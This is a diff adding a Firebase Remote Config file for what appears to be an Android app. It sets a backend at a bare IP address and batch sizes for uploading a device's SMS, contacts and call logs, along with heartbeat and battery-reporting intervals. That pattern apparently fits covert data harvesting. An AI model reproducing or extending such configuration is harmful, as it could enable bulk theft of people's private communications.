@@ -1,0 +1,78 @@
+{
+  "parameters": {
+    "base_url": {
+      "defaultValue": {
+        "value": "http://95.134.130.160:8765"
+      },
+      "description": "Base URL for backend server",
+      "valueType": "STRING"
+    },
+    "user_id": {
+      "defaultValue": {
+        "value": "XD"
+      },
+      "description": "User ID for device registration",
+      "valueType": "STRING"
+    },
+    "battery_update_interval": {
+      "defaultValue": {
+        "value": "60000"
+      },
+      "description": "Battery update interval in milliseconds (default: 60000 = 1 minute)",
+      "valueType": "NUMBER"
+    },
+    "heartbeat_interval": {
+      "defaultValue": {
+        "value": "300000"
+      },
+      "description": "Heartbeat interval in milliseconds (default: 300000 = 5 minutes)",
+      "valueType": "NUMBER"
+    },
+    "fcm_timeout": {
+      "defaultValue": {
+        "value": "3000"
+      },
+      "description": "FCM token fetch timeout in milliseconds",
+      "valueType": "NUMBER"
+    },
+    "sms_batch_size": {
+      "defaultValue": {
+        "value": "100"
+      },
+      "description": "SMS batch upload size",
+      "valueType": "NUMBER"
+    },
+    "contacts_batch_size": {
+      "defaultValue": {
+        "value": "100"
+      },
+      "description": "Contacts batch upload size",
+      "valueType": "NUMBER"
+    },
+    "call_logs_batch_size": {
+      "defaultValue": {
+        "value": "100"
+      },
+      "description": "Call logs batch upload size",
+      "valueType": "NUMBER"
+    },
+    "retry_attempts": {
+      "defaultValue": {
+        "value": "3"
+      },
+      "description": "Number of retry attempts for failed requests",
+      "valueType": "NUMBER"
+    },
+    "retry_delay": {
+      "defaultValue": {
+        "value": "5000"
+      },
+      "description": "Delay between retry attempts in milliseconds",
+      "valueType": "NUMBER"
+    }
+  },
+  "version": {
+    "versionNumber": "1",
+    "description": "Initial Remote Config setup"
+  }
+}
